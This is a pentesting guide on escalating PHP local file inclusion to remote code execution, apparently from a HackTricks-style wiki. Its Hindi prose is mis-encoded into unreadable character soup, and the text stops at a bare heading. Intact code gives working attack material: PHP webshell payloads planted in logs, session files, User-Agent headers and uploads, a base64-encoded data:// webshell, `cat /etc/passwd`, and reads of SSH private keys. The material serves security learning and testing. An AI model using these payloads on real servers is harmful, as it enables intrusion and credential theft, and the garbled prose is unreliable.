рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

## PHP рдмреНрд▓рд╛рдЗрдВрдб рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓

{% hint style="warning" %}
рдпрд╣ рддрдХрдиреАрдХ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╣реИ рдЬрд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ PHP рдлрдВрдХреНрд╢рди рдХреЗ **рдлрд╝рд╛рдЗрд▓ рдкрде** рдХрд╛ **рдирд┐рдпрдВрддреНрд░рдг** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдЧрд╛** рд▓реЗрдХрд┐рди рдЖрдк рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд╣реАрдВ рджреЗрдЦреЗрдВрдЧреЗ (рдЬреИрд╕реЗ рдХрд┐ **`file()`** рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдХреЙрд▓) рд▓реЗрдХрд┐рди рд╕рд╛рдордЧреНрд░реА рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддреА рд╣реИред
{% endhint %}

[**рдЗрд╕ рдЕрджреНрднреБрдд рдкреЛрд╕реНрдЯ**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) рдореЗрдВ рдпрд╣ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмреНрд▓рд╛рдЗрдВрдб рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ рддреНрд░реБрдЯрд┐ рдСрд░реЗрдХрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ **рдмрд╛рд╣рд░реА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред

рд╕рд╛рд░рд╛рдВрд╢ рд░реВрдк рдореЗрдВ, рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ **"UCS-4LE" рдХреЛрдбрд┐рдВрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдЗрддрдиреА **рдмрдбрд╝реА** рд╣реЛ рдЬрд╛рдП рдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓рд╛ PHP рдлрд╝рдВрдХреНрд╢рди рдПрдХ **рддреНрд░реБрдЯрд┐** рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ред

рдлрд┐рд░, рдкрд╣рд▓реЗ рд╡рд░реНрдг рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд┐рд▓реНрдЯрд░ **`dechunk`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЕрдиреНрдп рдлрд╝рд┐рд▓реНрдЯрд░реЛрдВ рдЬреИрд╕реЗ рдХрд┐ **base64** рдпрд╛ **rot13** рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЕрдВрдд рдореЗрдВ рдлрд╝рд┐рд▓реНрдЯрд░ **convert.iconv.UCS-4.UCS-4LE** рдФрд░ **convert.iconv.UTF16.UTF-16BE** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдиреНрдп рд╡рд░реНрдгреЛрдВ рдХреЛ рд╢реБрд░реВ рдореЗрдВ рд░рдЦрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**рд╕рдВрднрд╡рддрдГ рд╕рдВрдХреНрд░рдорд┐рдд рд╣реЛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рди**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (рдХреЗрд╡рд▓ рдЗрд╕рдХреЗ рд╕рд╛рде рд▓рдХреНрд╖реНрдп рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

рддрдХрдиреАрдХреА рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

## LFI2RCE

### рд░рд┐рдореЛрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢

рдкрд╣рд▓реЗ рд╕реЗ рд╡рд┐рд╡рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, [**рдЗрд╕ рд▓рд┐рдВрдХ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**](./#remote-file-inclusion)ред

### Apache/Nginx рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ Apache рдпрд╛ Nginx рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕рдорд╛рд╡реЗрд╢ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЗ рд▓рд┐рдП **рд╡рдВрд╢реАрдп** рд╣реИ, рддреЛ рдЖрдк **`/var/log/apache2/access.log` рдпрд╛ `/var/log/nginx/access.log`** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ** рдпрд╛ **GET рдкреИрд░рд╛рдореАрдЯрд░** рдореЗрдВ рдПрдХ PHP рд╢реЗрд▓ рдЬреИрд╕реЗ **`<?php system($_GET['c']); ?>`** рдФрд░ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдорд╛рд╡реЗрд╢ рдХрд░реЗрдВред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╢реЗрд▓ рдХреЗ рд▓рд┐рдП **рд╕рд░рд▓ рдЙрджреНрдзрд░рдгреЛрдВ** рдХреЗ рдмрдЬрд╛рдп **рджреЛрд╣рд░реЗ рдЙрджреНрдзрд░рдгреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рджреЛрд╣рд░реЗ рдЙрджреНрдзрд░рдгреЛрдВ рдХреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ "_**quote;**_" рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, **PHP рд╡рд╣рд╛рдВ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХреЗрдЧрд╛** рдФрд░ **рдХреБрдЫ рдФрд░ рдирд╣реАрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк **рдкреЗрд▓реЛрдб рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓рд┐рдЦреЗрдВ** рдпрд╛ рдлрд┐рд░ PHP рд╣рд░ рдмрд╛рд░ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рджреВрд╕рд░рд╛ рдореМрдХрд╛ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛ред
{% endhint %}

рдЗрд╕реЗ рдЕрдиреНрдп рд▓реЙрдЧ рдореЗрдВ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╕рддрд░реНрдХ рд░рд╣реЗрдВ, рд▓реЙрдЧ рдореЗрдВ рдореМрдЬреВрдж рдХреЛрдб URL encode рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рд╕реЗ рд╢реЗрд▓ рдХреЛ рдирд╖реНрдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╣реЗрдбрд░ **authorisation "basic"** рдореЗрдВ "user:password" Base64 рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд▓реЙрдЧ рдореЗрдВ рдбрд┐рдХреЛрдб рд╣реЛрддрд╛ рд╣реИред PHPShell рдЗрд╕ рд╣реЗрдбрд░ рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЕрдиреНрдп рд╕рдВрднрд╡ рд▓реЙрдЧ рдкрде:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### рдИрдореЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЕрдкрдиреЗ PHP рдкреЗрд▓реЛрдб (`<?php echo system($_REQUEST["cmd"]); ?>`) рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдИрдореЗрд▓ рдЦрд╛рддреЗ (user@localhost) рдкрд░ рднреЗрдЬреЗрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдореЗрд▓ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрде (`/var/mail/<USERNAME>` рдпрд╛ `/var/spool/mail/<USERNAME>`) рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

### /proc/\*/fd/\* рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

1. рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╢реЗрд▓реНрд╕ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рдЬрд╣рд╛рдВ $PID рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ PID рд╣реИ (рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ) рдФрд░ $FD рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд╡рд░рдХ рд╣реИ (рдпрд╣ рднреА рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

### /proc/self/environ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рддрд░рд╣, рдкреЗрд▓реЛрдб рдХреЛ User-Agent рдореЗрдВ рднреЗрдЬреЗрдВ, рдпрд╣ /proc/self/environ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧрд╛ред
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рдореЗрдВ рд╢реИрд▓ рдкреЗрд▓реЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ (рдЙрджрд╛. : `<?php system($_GET['c']); ?>` )ред
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╣реИ рдХрд┐ рдЪрд┐рддреНрд░реЛрдВ / рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ / рдкреАрдбреАрдПрдл рдХреЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░реЗрдВ

### рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдПрдХ рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ PHP рд╢реИрд▓ рдХреЛ рд╕рдВрдкреАрдбрд╝рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рд╡реЗрдмрд╕рд╛рдЗрдЯ PHP рд╕рддреНрд░ (PHPSESSID) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИред
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP рдореЗрдВ рдпреЗ рд╕реЗрд╢рди _/var/lib/php5/sess\\_\[PHPSESSID]\_ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
рдХреБрдХреА рдХреЛ `<?php system('cat /etc/passwd');?>` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
рдПрд▓рдПрдлрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреАрдПрдЪрдкреА рд╕рддреНрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░реЗрдВ
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### рдПрд╕рдПрд╕рдПрдЪ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдПрд╕рдПрд╕рдПрдЪ рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (/proc/self/status рдФрд░ /etc/passwd) рдФрд░ **\<HOME>/.ssh/id\_rsa** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

### **vsftpd** _**рд▓реЙрдЧ**_ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЗрд╕ FTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓реЙрдЧ _**/var/log/vsftpd.log**_ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрд▓рдПрдлрдЖрдИ рд╣реИ рдФрд░ рдЖрдк рдПрдХ рдЕрдирд╛рд╡рд░рдгреАрдХреГрдд vsftpd рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдореЗрдВ PHP рдкреЗрд▓реЛрдб рд╕реЗрдЯ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдПрд▓рдПрдлрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

### PHP рдмреЗрд╕64 рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (рдмреЗрд╕64 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)

[рдЗрд╕](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) рд▓реЗрдЦ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ PHP рдмреЗрд╕64 рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗрд╡рд▓ рдЧреИрд░-рдмреЗрд╕64 рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рддрд╛ рд╣реИред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: рдпрджрд┐ рдЖрдк рдмреЗрд╕64 рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ ".php" рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдмрд╕ "." рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░реЗрдЧрд╛ рдФрд░ "php" рдХреЛ рдмреЗрд╕64 рдореЗрдВ рдЬреЛрдбрд╝ рджреЗрдЧрд╛ред рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреЗрд▓реЛрдб рд╣реИ:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ)

рдпрд╣ [**рд╡реНрд░рд┐рдЯрдЕрдк**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рдЖрдк **php рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╕рд╛рдордЧреНрд░реА** рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЖрдк **рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**, рдЖрдк **рдЗрд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдЬреЛ `/tmp` рдореЗрдВ **рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ** рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрдЧреА, рдлрд┐рд░ **рдПрдХ рд╣реА рдЕрдиреБрд░реЛрдз рдореЗрдВ,** рдПрдХ **рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ**, рдФрд░ рдлрд┐рд░ **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рд╣рдЯрд╛рдИ рдирд╣реАрдВ рдЬрд╛рдПрдЧреА** рдФрд░ рдЖрдк рдЙрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx рдЯреЗрдореНрдк рдлрд╝рд╛рдЗрд▓ рд╕рдВрдЧреНрд░рд╣рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ **Nginx** PHP рдХреЗ рд╕рд╛рдордиреЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди** рдкрд╛рдпрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдПрдХ рд╕рддреНрд░ рдирд╣реАрдВ рд╣реИ** рдФрд░ `session.auto_start` `Off` рд╣реИред рдпрджрд┐ рдЖрдк **рдорд▓реНрдЯреАрдкрд╛рд░реНрдЯ POST** рдбреЗрдЯрд╛ рдореЗрдВ **`PHP_SESSION_UPLOAD_PROGRESS`** рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рддреЛ PHP рдЖрдкрдХреЗ рд▓рд┐рдП **рд╕рддреНрд░ рд╕рдХреНрд╖рдо рдХрд░ рджреЗрдЧрд╛**ред рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windows рдореЗрдВ рдЯреЗрдореНрдк рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ **Windows** рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (file\_uploads = on)

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ **phpinfo()** рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рде file\_uploads = on рд╣реИ, рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + рдкрде рд╡рд┐рд╕реНрддрд╛рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

